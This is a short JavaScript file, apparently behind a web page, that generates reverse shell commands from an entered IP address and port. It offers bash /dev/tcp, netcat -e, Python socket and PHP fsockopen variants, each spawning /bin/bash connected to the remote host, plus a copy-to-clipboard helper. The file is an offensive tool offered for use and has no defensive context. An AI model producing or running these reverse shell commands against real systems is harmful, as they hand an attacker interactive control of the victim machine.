function generateShell() {
  const ip = document.getElementById("ip").value.trim();
  const port = document.getElementById("port").value.trim();
  const shellType = document.getElementById("shellType").value;
  const output = document.getElementById("output");

  if (!ip || !port) {
    output.textContent = "Please enter both IP and Port.";
    return;
  }

  let shellCommand = "";
  switch (shellType) {
    case "bash":
      shellCommand = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
      break;
    case "nc":
      shellCommand = `nc -e /bin/bash ${ip} ${port}`;
      break;
    case "python":
      shellCommand = `python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("${ip}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash"])'`;
      break;
    case "php":
      shellCommand = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/bash -i <&3 >&3 2>&3");'`;
      break;
  }

  output.textContent = shellCommand;
}

function copyToClipboard() {
  const output = document.getElementById("output");
  navigator.clipboard.writeText(output.textContent)
    .then(() => alert("Copied to clipboard!"))
    .catch(err => alert("Failed to copy."));
}
